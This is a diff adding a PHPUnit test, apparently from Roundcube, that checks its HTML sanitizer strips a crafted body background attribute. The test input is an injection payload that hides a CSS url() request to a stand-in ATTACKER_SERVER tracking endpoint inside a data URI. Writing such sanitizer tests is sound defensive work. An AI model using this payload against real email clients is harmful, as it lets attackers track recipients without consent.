@@ -247,6 +247,13 @@ class Framework_Washtml extends PHPUnit\Framework\TestCase
         $this->assertRegExp('|link="#111"|', $washed, "Body link attribute");
         $this->assertRegExp('|alink="#222"|', $washed, "Body alink attribute");
         $this->assertRegExp('|vlink="#333"|', $washed, "Body vlink attribute");
+
+        $html = '<html><body background="data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=test"></body></html>';
+
+        $washer = new \rcube_washtml(['html_elements' => ['body']]);
+        $washed = $washer->wash($html);
+
+        $this->assertRegExp('|x-washed="background"|', $washed, 'Body evil background');
     }
 
     /**
